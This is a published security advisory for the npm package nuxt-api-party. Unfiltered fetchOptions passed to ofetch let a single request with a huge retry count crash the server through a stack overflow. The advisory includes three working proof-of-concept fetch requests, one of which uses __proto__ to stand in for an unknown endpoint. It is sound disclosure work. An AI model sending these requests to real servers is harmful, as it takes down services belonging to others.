# [H] DOS by abusing `fetchOptions.retry`. 

## Summary
Severity: High
Advisory: GHSA-q6hx-3m4p-749h
CVE: CVE-2023-49800
CWE: CWE-400, CWE-787
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-12-11
Source: https://github.com/advisories/GHSA-q6hx-3m4p-749h
Type: github-advisory

## Affected
- npm: `nuxt-api-party` — affected >=0 <0.22.1

## Details
### Summary
`nuxt-api-party` allows developers to proxy requests to an API without exposing credentials to the client. [`ofetch`](https://github.com/unjs/ofetch) is used to send the requests. 

The library allows the user to send many options directly to `ofetch`. There is no filter on which options are available. We can abuse the retry logic to cause the server to crash from a stack overflow.

### Details
`fetchOptions` [are obtained directly from the request body](https://github.com/johannschopplich/nuxt-api-party/blob/777462e1e3af1d9f8938aa33f230cd8cb6e0cc9a/src/runtime/server/handler.ts#L27). These are then [passed directly into `ofetch`
](https://github.com/johannschopplich/nuxt-api-party/blob/777462e1e3af1d9f8938aa33f230cd8cb6e0cc9a/src/runtime/server/handler.ts#L57C15-L57C15).

We can construct a URL we know will not fetch successfully, then set the retry attempts to a high value, this will cause a stack overflow as ofetch error handling works recursively. 

### PoC
POC using Node.

```js
await fetch("http://localhost:3000/api/__api_party/MyEndpoint", {
    method: "POST",
    body: JSON.stringify({ path: "x:x", retry: 9999999 }),
    headers: { "Content-Type": "application/json" }
})
```

We can use `__proto__` as a substitute for the endpoint if it is not known.

```js
await fetch("http://localhost:3000/api/__api_party/__proto__", {
    method: "POST",
    body: JSON.stringify({ path: "x:x", retry: 9999999 }),
    headers: { "Content-Type": "application/json" }
})
```

We can build the size of the stack faster by using more complicated URIs
```js
await fetch("http://localhost:3000/api/__api_party/__proto__", {
    method: "POST",
    body: JSON.stringify({ path: "data:x;base64,----", retry: 9999999 }),
    headers: { "Content-Type": "application/json" }
})
```

### Impact
Full DOS, server is unusable during attack. Requires a single request. 

### Fix 
Limit which options can be passed to `ofetch`.

## References
- https://github.com/johannschopplich/nuxt-api-party/security/advisories/GHSA-q6hx-3m4p-749h
- https://nvd.nist.gov/vuln/detail/CVE-2023-49800
- https://github.com/johannschopplich/nuxt-api-party
